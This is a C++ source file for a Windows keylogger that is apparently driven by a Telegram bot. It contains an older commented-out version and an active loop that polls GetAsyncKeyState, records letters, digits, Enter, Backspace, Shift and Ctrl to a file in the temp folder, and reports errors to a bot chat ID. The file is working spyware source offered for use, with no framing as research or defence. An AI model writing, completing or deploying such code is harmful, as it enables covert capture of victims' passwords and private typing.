#include "keyLogger.h"

// Not efficient keyLogger
/*void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id) {
	using namespace std;

	while (isKeyLoggerRunning)
	{
		ofstream outfile(filename, ios::app); // creating a file (if it does not already exist)

		// Checking if there are problems with access to the file
		if (!outfile)
		{
			bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
			break;
		}

		for (int i = 0; i < 0xA3; i++)
		{
			// If a key was pressed...
			if (GetAsyncKeyState(i) & 0b1)
			{
				if (i >= 0x30 && i <= 0x5A)     // keys 0-9 and 'A'-'Z' https://learn.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes
					outfile << (char)i;

				else if (i == VK_RETURN)        // other keys
					outfile << "[ENTER]\n";

				else if (i == VK_BACK)
					outfile << "[BACKSPACE]";

				else if (i == VK_SPACE)
					outfile << ' ';

				else if (i == VK_SHIFT)
					outfile << "[SHIFT]";

				else if (i == VK_CONTROL)
					outfile << "[CTRL]";
			};
		}
		outfile.close();
	}
}*/


void startKeyLogger(const TgBot::Bot& bot_ref, int64_t chat_id) {
    using namespace std;

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    string tempFilePath = string(tempPath) + klFileName;

    ofstream outfile(tempFilePath, ios::app);
    if (!outfile) {
        bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
        return;
    }

    unordered_map<int, bool> pressedKeys;

    while (isKeyLoggerRunning) {
        bool keyLogged = false;

        for (int i = 0x08; i <= 0xA2; i++) {
            bool isPressed = GetAsyncKeyState(i) & 0x8000;

            if (isPressed && !pressedKeys[i]) {
                pressedKeys[i] = true;
                keyLogged = true;

                if (i >= 0x30 && i <= 0x5A)
                    outfile << (char)i;
                else if (i == VK_RETURN)
                    outfile << "[ENTER]\n";
                else if (i == VK_BACK)
                    outfile << "[BACKSPACE]";
                else if (i == VK_SPACE)
                    outfile << ' ';
                else if (i == VK_SHIFT)
                    outfile << "[SHIFT]";
                else if (i == VK_CONTROL)
                    outfile << "[CTRL]";
            }
            else if (!isPressed) {
                pressedKeys[i] = false;
            }
        }

        if (keyLogged)
            outfile.flush();

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    outfile.close();
}